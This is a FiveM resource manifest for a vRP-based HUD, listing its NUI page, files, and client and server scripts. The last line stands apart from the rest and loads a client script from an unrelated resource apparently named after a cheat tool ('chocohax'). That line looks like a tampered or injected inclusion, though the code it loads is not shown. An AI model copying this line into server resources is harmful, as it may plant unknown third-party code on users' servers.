
resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'
description "hud"

ui_page "nui/index.html"
files {
	'nui/index.html',
	'nui/style.css',
  'nui/scripts.js',
  'nui/img/*'
}

client_scripts{ 
  "@vrp/client/Tunnel.lua",
  "@vrp/client/Proxy.lua",
  "client.lua",
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}

client_script '@chocohax/10992.lua'